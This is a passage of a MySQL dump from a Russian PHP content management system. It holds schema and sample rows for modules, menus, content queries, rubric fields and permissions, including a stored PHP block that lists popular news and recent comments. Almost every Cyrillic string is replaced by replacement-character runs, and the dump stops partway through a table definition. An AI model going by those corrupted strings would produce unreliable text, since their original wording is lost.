INSERT INTO `cp_modul_sysblock` VALUES (20, '����� 1,2,3', '<!-- ���� ���������� �������� -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-popnews">���������� �������</a></h2>\r\n<div id="popnews" class="block"><?php\r\n$limit = 3; // ���������� �������� � ������\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		COUNT(cmnt.Id) AS comments, \r\n		doc.Id, \r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt\r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	GROUP BY cmnt.document_id \r\n	ORDER BY comments DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? translit_string($row->Titel) : $row->Url);\r\n	$Url = REWRITE_MODE ? rewrite_link($Url) : $Url;\r\n	echo ''<p><strong>'', ++$i, ''.</strong> <a href="'', $Url, ''">'', \r\n		htmlspecialchars(substr($row->Titel, 0, 36), ENT_QUOTES), \r\n		((strlen($row->Titel)>36) ? ''...'' : ''''), \r\n		''</a><small style="text-align:right;">(������������: '', \r\n		$row->comments, '')</small></p>'';\r\n}\r\n?></div>\r\n</div>\r\n<!-- ���� �������� ������������ -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-popcommentors">�������� ������������</a></h2>\r\n<div id="popcommentors" class="block"><?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		author_name, \r\n		COUNT(author_id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE author_id != ''0''\r\n	GROUP BY author_id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<p><strong>'', ++$i, '' �����:</strong> '', \r\n		htmlspecialchars($row->author_name, ENT_QUOTES),\r\n		''<small style="text-align:right;">(������������: '',\r\n		$row->comments, '')</small></p>'';\r\n}\r\n?></div>\r\n</div>\r\n<!-- ���� ��������� ����������� -->\r\n<div class="box">\r\n<h2><a href="#" id="toggle-lastcomments">��������� �����������</a></h2>\r\n<div id="lastcomments" class="block"><?php\r\n$limit = 3;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		cmnt.author_name, \r\n		LEFT(cmnt.message, 150) AS comment, \r\n		cmnt.published,\r\n		doc.Id,\r\n		doc.Titel, \r\n		doc.Url \r\n	FROM " . PREFIX . "_modul_comment_info AS cmnt \r\n	JOIN " . PREFIX . "_documents AS doc ON doc.Id = cmnt.document_id\r\n	WHERE status = 1\r\n	ORDER BY cmnt.Id DESC \r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	$Url = ''index.php?id='' . $row->Id . ''&amp;doc='' \r\n		. (empty($row->Url) ? translit_string($row->Titel) : $row->Url);\r\n	$Url = REWRITE_MODE ? rewrite_link($Url) : $Url;\r\n	echo ''<p><small>�������:'', htmlspecialchars($row->author_name), '' � '', \r\n		pretty_date(strftime(TIME_FORMAT,$row->published), DEFAULT_LANGUAGE),\r\n		''</small><a title="'', htmlspecialchars($row->Titel, ENT_QUOTES),\r\n		''"href="'', $Url, ''"><em>"'', htmlspecialchars($row->comment, ENT_QUOTES), \r\n		(strlen($row->comment)==150 ? ''...'' : ''''), ''"</em></a></p><hr/>'';\r\n}\r\n?></div>\r\n</div>');
INSERT INTO `cp_modul_sysblock` VALUES (21, '�������� ����', '<p>��������</p>');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_who_is_online`
-- 

CREATE TABLE `cp_modul_who_is_online` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `ip` int(11) NOT NULL default '0',
  `country` char(64) NOT NULL default '',
  `countrycode` char(2) NOT NULL default '',
  `city` char(64) NOT NULL default '',
  `dt` timestamp NOT NULL default CURRENT_TIMESTAMP,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `ip` (`ip`),
  KEY `countrycode` (`countrycode`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_who_is_online`
-- 

INSERT INTO `cp_modul_who_is_online` VALUES (1, 2130706433, '(Private Address)', 'XX', '(Private Address)', '2010-07-08 23:47:21');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_module`
-- 

CREATE TABLE `cp_module` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `ModulName` char(50) NOT NULL,
  `Status` enum('1','0') NOT NULL default '1',
  `CpEngineTag` char(255) NOT NULL,
  `CpPHPTag` char(255) NOT NULL,
  `ModulFunktion` char(255) NOT NULL,
  `IstFunktion` enum('1','0') NOT NULL default '1',
  `ModulPfad` char(50) NOT NULL,
  `Version` char(20) NOT NULL default '1.0',
  `Template` smallint(3) unsigned NOT NULL default '1',
  `AdminEdit` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `ModulName` (`ModulName`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_module`
-- 

INSERT INTO `cp_module` VALUES (1, 'Download', '1', '', '', '', '0', 'download', '2.0', 1, '1');
INSERT INTO `cp_module` VALUES (2, 'Who is online', '1', '#\\[mod_online]#', '<?php mod_online(); ?>', 'mod_online', '1', 'whoisonline', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (3, '�����������', '1', '#\\[mod_login]#', '<?php mod_login(); ?>', 'mod_login', '1', 'login', '2.2', 1, '1');
INSERT INTO `cp_module` VALUES (4, '����� ����������', '1', '#\\[mod_newsarchive:(\\d+)]#', '<?php mod_newsarchive(''$1''); ?>', 'mod_newsarchive', '1', 'newsarchive', '1.1', 1, '1');
INSERT INTO `cp_module` VALUES (5, '������', '1', '#\\[mod_banner:(\\d+)]#', '<?php mod_banner(''$1''); ?>', 'mod_banner', '1', 'media', '1.3', 0, '1');
INSERT INTO `cp_module` VALUES (6, '������/�����', '1', '#\\[mod_faq:(\\d+)]#', '<?php mod_faq(''$1''); ?>', 'mod_faq', '1', 'faq', '1.0', 0, '1');
INSERT INTO `cp_module` VALUES (7, '�������', '1', '#\\[mod_gallery:([\\d-]+)]#', '<?php mod_gallery(''$1''); ?>', 'mod_gallery', '1', 'gallery', '2.2', 0, '1');
INSERT INTO `cp_module` VALUES (8, '����� �����', '1', '#\\[mod_sitemap:([\\d,]*)]#', '<?php mod_sitemap(''$1''); ?>', 'mod_sitemap', '1', 'sitemap', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (9, '�����������', '1', '#\\[mod_comment]#', '<?php mod_comment(); ?>', 'mod_comment', '1', 'comment', '1.2', 0, '1');
INSERT INTO `cp_module` VALUES (10, '��������', '1', '#\\[mod_contact:(\\d+)]#', '<?php mod_contact(''$1''); ?>', 'mod_contact', '1', 'contact', '2.3', 0, '1');
INSERT INTO `cp_module` VALUES (11, '�������', '1', '', '', '', '0', 'shop', '1.4', 2, '1');
INSERT INTO `cp_module` VALUES (12, '���������', '1', '#\\[mod_navigation:(\\d+)]#', '<?php mod_navigation(''$1''); ?>', 'mod_navigation', '1', 'navigation', '1.2', 0, '0');
INSERT INTO `cp_module` VALUES (13, '������', '1', '#\\[mod_poll:(\\d+)]#', '<?php mod_poll(''$1''); ?>', 'mod_poll', '1', 'poll', '1.0', 1, '1');
INSERT INTO `cp_module` VALUES (14, '�����', '1', '#\\[mod_search]#', '<?php mod_search(); ?>', 'mod_search', '1', 'search', '2.0', 1, '1');
INSERT INTO `cp_module` VALUES (15, '�������������', '1', '#\\[mod_recommend]#', '<?php mod_recommend(); ?>', 'mod_recommend', '1', 'recommend', '1.0', 0, '0');
INSERT INTO `cp_module` VALUES (16, '��������� �����', '1', '#\\[mod_sysblock:(\\d+)]#', '<?php mod_sysblock(''$1''); ?>', 'mod_sysblock', '1', 'sysblock', '1.1', 0, '1');
INSERT INTO `cp_module` VALUES (17, '������', '1', '', '', '', '0', 'forums', '1.2', 3, '1');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_navigation`
-- 

CREATE TABLE `cp_navigation` (
  `id` smallint(3) unsigned NOT NULL auto_increment,
  `navi_titel` varchar(255) NOT NULL,
  `navi_level1` text NOT NULL,
  `navi_level2` text NOT NULL,
  `navi_level3` text NOT NULL,
  `navi_level1active` text NOT NULL,
  `navi_level2active` text NOT NULL,
  `navi_level3active` text NOT NULL,
  `navi_level1begin` text NOT NULL,
  `navi_level1end` text NOT NULL,
  `navi_level2begin` text NOT NULL,
  `navi_level2end` text NOT NULL,
  `navi_level3begin` text NOT NULL,
  `navi_level3end` text NOT NULL,
  `navi_begin` text NOT NULL,
  `navi_end` text NOT NULL,
  `navi_user_group` text NOT NULL,
  `navi_expand` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_navigation`
-- 

INSERT INTO `cp_navigation` VALUES (1, '������������ ����', '<li><a href=''[tag:link]'' title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li class=''active''><b><a target=''[tag:target]'' href="[tag:link]">[tag:linkname]</a></b></li>\r\n', '<li class="active"><b><a target="[tag:target]" href="[tag:link]" title="[tag:linkname]">[tag:linkname]</a></b></li>\r\n', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="menu_v" style="margin-bottom:0;">', '</ul>', '<ul>', '</ul>', '<ul>', '</ul>', '<!-- vnavi -->', '<!-- /vnavi -->', '1,2,3,4', '0');
INSERT INTO `cp_navigation` VALUES (2, '�������������� ����', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="nav">', '</ul>', '<ul>', '</ul>', '<ul>', '</ul>', '<!-- hnavi -->', '<!-- /hnavi -->', '1,2,3,4', '0');
INSERT INTO `cp_navigation` VALUES (3, '�������������� ���� ', '<li class="li-<?=$styles[$it]?>"><a class="nav-<?=$styles[$it];++$it?>" href="[tag:link]">[tag:linkname]&nbsp;&nbsp;<img src="templates/elle/images/bg-menu-head-a.png" width="9" height="10" border="0" alt="" /></a>', '<li><a style="padding-left: 15px; background-position: 0px 12px;" href="[tag:link]">[tag:linkname]</a></li>', '<li><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></li>', '<li class="li-<?=$styles[$it]?>"><a class="nav-<?=$styles[$it];++$it?>" href="[tag:link]">[tag:linkname]&nbsp;&nbsp;<img src="templates/elle/images/bg-menu-head-a.png" width="9" height="10" border="0" alt="" /></a>', '<li><a style="padding-left: 15px; background-position: 0px 12px;" href="[tag:link]">[tag:linkname]</a></li>', '<li><b><a href="[tag:link]" title="[tag:linkname]" target="[tag:target]">[tag:linkname]</a></b></li>', '<ul class="sf-menu sf-js-enabled">', '</ul>', '<ul style="display: none; visibility: hidden; opacity: 0.9;">', '</ul>', '<ul>', '</ul>', '<!-- hnavi -->\r\n<?$it=0;$styles=array(''elle'',''news'',''articls'',''where'',''advert'',''contact'');?>\r\n<div class="main_menu">\r\n', '</div>\r\n<!-- /hnavi -->', '1,2,3,4', '1');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_navigation_items`
-- 

CREATE TABLE `cp_navigation_items` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `title` char(255) NOT NULL,
  `parent_id` mediumint(5) unsigned NOT NULL,
  `navi_item_link` char(255) NOT NULL,
  `navi_item_target` enum('_blank','_self','_parent','_top') NOT NULL default '_self',
  `navi_item_level` enum('1','2','3') NOT NULL default '1',
  `navi_item_position` smallint(3) unsigned NOT NULL default '1',
  `navi_id` smallint(3) unsigned NOT NULL default '0',
  `navi_item_status` enum('1','0') NOT NULL default '1',
  `document_alias` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `navi_id` (`navi_id`),
  KEY `document_alias` (`document_alias`),
  KEY `navi_item_status` (`navi_item_status`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_navigation_items`
-- 

INSERT INTO `cp_navigation_items` VALUES (1, '����������� �������', 0, 'index.php?id=16', '_self', '1', 1, 1, '1', 'osobennosti-shablona');
INSERT INTO `cp_navigation_items` VALUES (2, '� ��������', 0, 'index.php?id=3', '_self', '1', 2, 1, '1', '�-��������');
INSERT INTO `cp_navigation_items` VALUES (3, '������� ������', 0, 'index.php?id=4', '_self', '1', 3, 1, '1', '�������-������');
INSERT INTO `cp_navigation_items` VALUES (4, '��������', 0, 'index.php?id=5', '_self', '1', 4, 1, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (5, '����� ��������', 0, 'index.php?id=7', '_self', '1', 5, 1, '1', '�������');
INSERT INTO `cp_navigation_items` VALUES (6, '������ �������', 0, 'index.php?id=9', '_self', '1', 8, 1, '1', 'primer-galerei');
INSERT INTO `cp_navigation_items` VALUES (7, 'Google Maps', 0, 'index.php?id=13', '_self', '1', 10, 1, '1', 'google-maps');
INSERT INTO `cp_navigation_items` VALUES (8, '������� 1', 5, 'index.php?id=6', '_self', '2', 1, 1, '1', '�������/2009-08-07/������-��������-�������');
INSERT INTO `cp_navigation_items` VALUES (9, '������� 2', 5, 'index.php?id=8', '_self', '2', 2, 1, '1', '�������/2009-08-15/������-��������-�������');
INSERT INTO `cp_navigation_items` VALUES (10, '�����������', 1, 'index.php?id=17', '_self', '2', 10, 1, '1', 'tipografika');
INSERT INTO `cp_navigation_items` VALUES (11, '960px grid system', 1, 'index.php?id=18', '_self', '2', 20, 1, '1', '960px-grid-system');
INSERT INTO `cp_navigation_items` VALUES (12, 'FAQ', 0, 'index.php?id=10', '_self', '1', 1, 2, '1', 'faq');
INSERT INTO `cp_navigation_items` VALUES (13, '�������', 0, 'index.php?module=shop', '_self', '1', 2, 2, '1', 'index.php?module=shop');
INSERT INTO `cp_navigation_items` VALUES (14, '��������', 0, 'index.php?module=download', '_self', '1', 3, 2, '1', 'index.php?module=download');
INSERT INTO `cp_navigation_items` VALUES (15, '��������', 0, 'index.php?id=5', '_self', '1', 4, 2, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (16, '�����', 0, 'index.php?module=forums', '_self', '1', 5, 2, '1', 'index.php?module=forums');
INSERT INTO `cp_navigation_items` VALUES (17, '�������', 0, 'index.php?id=1', '_self', '1', 10, 3, '1', '�������');
INSERT INTO `cp_navigation_items` VALUES (18, '�����������', 0, 'index.php?id=17', '_self', '1', 20, 3, '1', 'tipografika');
INSERT INTO `cp_navigation_items` VALUES (19, 'FAQ', 0, 'index.php?id=10', '_self', '1', 30, 3, '1', 'faq');
INSERT INTO `cp_navigation_items` VALUES (20, '��������', 0, 'index.php?id=5', '_self', '1', 40, 3, '1', 'kontakty');
INSERT INTO `cp_navigation_items` VALUES (21, '����� �����', 0, 'index.php?id=11', '_self', '1', 50, 3, '1', 'sitemap');
INSERT INTO `cp_navigation_items` VALUES (22, '������ �������', 0, 'index.php?id=9', '_self', '1', 60, 3, '1', 'primer-galerei');
INSERT INTO `cp_navigation_items` VALUES (23, '������ �������� �������', 17, 'index.php?id=6', '_self', '2', 10, 3, '1', '�������/2009-08-07/������-��������-�������');
INSERT INTO `cp_navigation_items` VALUES (24, 'Google Maps', 19, 'index.php?id=13', '_self', '2', 10, 3, '1', 'google-maps');
INSERT INTO `cp_navigation_items` VALUES (25, '����������� �������', 20, 'index.php?id=16', '_self', '2', 10, 3, '1', 'osobennosti-shablona');
INSERT INTO `cp_navigation_items` VALUES (26, '������ �������� �������', 17, 'index.php?id=8', '_self', '2', 20, 3, '1', '�������/2009-08-15/������-��������-�������');
INSERT INTO `cp_navigation_items` VALUES (27, '����� �����', 19, 'index.php?id=12', '_self', '2', 20, 3, '1', 'kopiya-mordy');
INSERT INTO `cp_navigation_items` VALUES (28, '������������ ���� more', 17, 'index.php?id=14', '_self', '2', 30, 3, '1', '�������/������������-����-more');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_request`
-- 

CREATE TABLE `cp_request` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `request_items_per_page` smallint(3) unsigned NOT NULL,
  `request_title` varchar(255) NOT NULL,
  `request_template_item` text NOT NULL,
  `request_template_main` text NOT NULL,
  `request_order_by` varchar(255) NOT NULL,
  `request_author_id` int(10) unsigned NOT NULL default '1',
  `request_created` int(10) unsigned NOT NULL,
  `request_description` tinytext NOT NULL,
  `request_asc_desc` enum('ASC','DESC') NOT NULL default 'DESC',
  `request_show_pagination` enum('0','1') NOT NULL default '0',
  `request_where_cond` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_request`
-- 

INSERT INTO `cp_request` VALUES (1, 2, 3, '��������� ������', '<div class="first article"> \r\n	[tag:rfld:6][250]\r\n	<h3><a href="[tag:link]">[tag:rfld:10][250]</a></h3>\r\n	<p>[tag:rfld:5][more]<a href="[tag:link]">� ��� �������</a></p>\r\n	<p class="meta">[tag:docdate] � ����������: ([tag:docviews]) � ������������: ([tag:doccomments])</p>\r\n</div>\r\n\r\n', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1145447477, '������� ������� �� ������� 2', 'DESC', '1', '');
INSERT INTO `cp_request` VALUES (2, 2, 1, '������ � ���������', '<div class="first article"> \r\n	[tag:rfld:6][350]\r\n	<h3><a href="[tag:link]">[tag:rfld:10][250]</a></h3>\r\n	<p>[tag:rfld:5][more]<a href="[tag:link]">� ��� �������</a></p>\r\n	<p class="meta">[tag:docdate] � ����������: ([tag:docviews]) � ������������: ([tag:doccomments])</p>\r\n</div>', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1252877884, '������� ������� �� ������� 2', 'DESC', '1', 'AND a.Id = ANY(SELECT t0.document_id FROM cp_document_fields AS t0 WHERE 0 OR(t0.rubric_field_id = ''5'' AND t0.field_value LIKE ''%���������%'' ) OR(t0.rubric_field_id = ''5'' AND t0.field_value LIKE ''%����%'' ) OR(t0.rubric_field_id = ''10'' AND t0.field_value LIKE ''%�����%'' ))');
INSERT INTO `cp_request` VALUES (3, 1, 2, '������������ ���� more', '<div class="first article"> \r\n	[tag:rfld:2][250]\r\n	<h3><a href="[tag:link]#more" title="[tag:rfld:4][-200]">[tag:rfld:4][250]</a></h3>\r\n	<p>[tag:rfld:1][more] <a href="[tag:link]">���������...</a></p>\r\n</div>', '[tag:content]', 'document_published', 1, 1263292589, '', 'DESC', '', '');
INSERT INTO `cp_request` VALUES (4, 3, 3, '������', '<div class="first article"> \r\n	[tag:rfld:31][999]\r\n	<h3><a href="[tag:link]">[tag:rfld:29][150]</a></h3>\r\n	<p>[tag:rfld:30][-150]<a href="[tag:link]">� ��� �������</a></p>\r\n	<p class="meta">����������: ([tag:docviews]) � ������������: ([tag:doccomments])</p>\r\n</div>\r\n\r\n', '<div>\r\n[tag:content]\r\n</div>\r\n[tag:pages]', 'document_published', 1, 1272800598, '������� ������', 'DESC', '1', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_request_conditions`
-- 

CREATE TABLE `cp_request_conditions` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `request_id` smallint(3) unsigned NOT NULL,
  `condition_compare` char(30) NOT NULL,
  `condition_field_id` int(10) NOT NULL,
  `condition_value` char(255) NOT NULL,
  `condition_join` enum('OR','AND') NOT NULL default 'OR',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_request_conditions`
-- 

INSERT INTO `cp_request_conditions` VALUES (1, 2, '%%', 5, '���������', 'OR');
INSERT INTO `cp_request_conditions` VALUES (2, 2, '%%', 5, '����', 'OR');
INSERT INTO `cp_request_conditions` VALUES (3, 2, '%%', 10, '�����', 'OR');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_rubric_fields`
-- 

CREATE TABLE `cp_rubric_fields` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `rubric_field_title` varchar(255) NOT NULL,
  `rubric_field_type` varchar(75) NOT NULL,
  `rubric_field_position` smallint(3) unsigned NOT NULL default '1',
  `rubric_field_default` text NOT NULL,
  `rubric_field_template` text NOT NULL,
  `rubric_field_template_request` text NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `rubric_id` (`rubric_id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_rubric_fields`
-- 

INSERT INTO `cp_rubric_fields` VALUES (1, 1, '����������', 'langtext', 3, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (2, 1, '����������� (������)', 'bild', 4, '', '[tag:if_notempty]\r\n<img style="padding-left:6px" align="right" src="[tag:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" border="0" />\r\n[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[tag:link]#more" class="image">\r\n<img style="padding-left:5px" align="right" src="[tag:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" border="0" />\r\n</a>\r\n[/tag:if_notempty]');
INSERT INTO `cp_rubric_fields` VALUES (4, 1, '���������', 'kurztext', 1, '��������� �� ���������', '', '');
INSERT INTO `cp_rubric_fields` VALUES (5, 2, '�������� ����� �������', 'langtext', 3, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (6, 2, '�����������', 'bild', 4, '', '[tag:if_notempty]<div class="contenticon">\r\n<img src="[cp:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" align="left" border="0" style="margin-right:.5em" />\r\n</div>[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[tag:link]#more" class="image"><img src="[tag:path]index.php?thumb=[tag:parametr:0]" alt="[tag:parametr:1]" border="0" /></a>\r\n[/tag:if_notempty]');
INSERT INTO `cp_rubric_fields` VALUES (10, 2, '���������', 'kurztext', 1, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (29, 3, '���������', 'kurztext', 1, '��������� �� ���������', '', '');
INSERT INTO `cp_rubric_fields` VALUES (30, 3, '����������', 'langtext', 3, '', '', '');
INSERT INTO `cp_rubric_fields` VALUES (31, 3, '����������� (������)', 'bild', 4, '', '[tag:if_notempty]<div class="contenticon">\r\n<img src="[cp:path]index.php?thumb=[tag:parametr:0]&amp;width=200" alt="[tag:parametr:1]" align="left" border="0" style="margin-right:.5em" />\r\n</div>[/tag:if_notempty]', '[tag:if_notempty]\r\n<a href="[link]#more" class="image"><img src="[cp:path]index.php?thumb=[tag:parametr:0]" alt="[tag:parametr:1]" border="0" /></a>\r\n[/tag:if_notempty]');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_rubric_permissions`
-- 

CREATE TABLE `cp_rubric_permissions` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `rubric_id` smallint(3) unsigned NOT NULL,
  `user_group_id` smallint(3) unsigned NOT NULL,
  `rubric_permission` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  KEY `rubric_id` (`rubric_id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_rubric_permissions`
-- 

INSERT INTO `cp_rubric_permissions` VALUES (1, 1, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (2, 1, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (3, 1, 3, 'docread|new|editown');
INSERT INTO `cp_rubric_permissions` VALUES (4, 1, 4, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (5, 2, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (6, 2, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (7, 2, 3, 'docread|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (8, 2, 4, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (9, 3, 1, 'docread|alles|new|newnow|editown');
INSERT INTO `cp_rubric_permissions` VALUES (10, 3, 2, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (11, 3, 3, 'docread');
INSERT INTO `cp_rubric_permissions` VALUES (12, 3, 4, 'docread');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_rubric_template_cache`
-- 

CREATE TABLE `cp_rubric_template_cache` (
  `id` bigint(15) unsigned NOT NULL auto_increment,
  `hash` char(32) NOT NULL,
  `rub_id` smallint(3) NOT NULL,
  `grp_id` smallint(3) NOT NULL default '2',
  `doc_id` int(10) NOT NULL,
  `wysiwyg` enum('0','1') NOT NULL default '0',
  `expire` int(10) unsigned default '0',
  `compiled` longtext NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `rubric_id` (`rub_id`,`doc_id`,`wysiwyg`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_rubric_template_cache`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_rubrics`
-- 

CREATE TABLE `cp_rubrics` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `rubric_title` varchar(255) NOT NULL,
  `rubric_alias` varchar(255) NOT NULL,
  `rubric_template` text NOT NULL,
  `rubric_template_id` smallint(3) unsigned NOT NULL default '1',
  `rubric_author_id` int(10) unsigned NOT NULL default '1',
  `rubric_created` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `rubric_template_id` (`rubric_template_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_rubrics`
-- 

INSERT INTO `cp_rubrics` VALUES (1, '�������� ��������', '', '<h2 id="page-heading">[tag:fld:4]</h2>\r\n[tag:fld:2][tag:fld:1]\r\n<div style="clear:both"></div>', 1, 1, 1250295071);
INSERT INTO `cp_rubrics` VALUES (2, '�������', '�������/%Y-%m-%d', '<h2 id="page-heading">[tag:fld:10]</h2>\r\n[tag:fld:27]\r\n[tag:fld:6]\r\n[tag:fld:5]\r\n[mod_comment]', 1, 1, 1250295071);
INSERT INTO `cp_rubrics` VALUES (3, '������', 'article', '<h2 id="page-heading">[tag:fld:29]</h2>\r\n[tag:fld:31][tag:fld:30]', 1, 1, 1272800070);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_sessions`
-- 

CREATE TABLE `cp_sessions` (
  `sesskey` varchar(32) NOT NULL,
  `expiry` int(10) unsigned NOT NULL default '0',
  `value` text NOT NULL,
  `Ip` varchar(35) NOT NULL,
  `expire_datum` varchar(25) NOT NULL,
  PRIMARY KEY  (`sesskey`),
  KEY `expiry` (`expiry`),
  KEY `expire_datum` (`expire_datum`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_sessions`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_settings`
-- 

CREATE TABLE `cp_settings` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `site_name` varchar(255) NOT NULL,
  `mail_type` enum('mail','smtp','sendmail') NOT NULL default 'mail',
  `mail_content_type` enum('text/plain','text/html') NOT NULL default 'text/plain',
  `mail_port` smallint(3) unsigned NOT NULL default '25',
  `mail_host` varchar(255) NOT NULL,
  `mail_smtp_login` varchar(50) NOT NULL,
  `mail_smtp_pass` varchar(50) NOT NULL,
  `mail_sendmail_path` varchar(255) NOT NULL default '/usr/sbin/sendmail',
  `mail_word_wrap` smallint(3) NOT NULL default '50',
  `mail_from` varchar(255) NOT NULL,
  `mail_from_name` varchar(255) NOT NULL,
  `mail_new_user` text NOT NULL,
  `mail_signature` text NOT NULL,
  `page_not_found_id` int(10) unsigned NOT NULL default '2',
  `message_forbidden` text NOT NULL,
  `navi_box` varchar(255) NOT NULL,
  `start_label` varchar(255) NOT NULL,
  `end_label` varchar(255) NOT NULL,
  `separator_label` varchar(255) NOT NULL,
  `next_label` varchar(255) NOT NULL,
  `prev_label` varchar(255) NOT NULL,
  `total_label` varchar(255) NOT NULL,
  `date_format` varchar(25) NOT NULL default '%d.%m.%Y',
  `time_format` varchar(25) NOT NULL default '%d.%m.%Y, %H:%M',
  `default_country` char(2) NOT NULL default 'ru',
  `use_doctime` enum('1','0') NOT NULL default '1',
  `hidden_text` text NOT NULL,
  PRIMARY KEY  (`Id`)
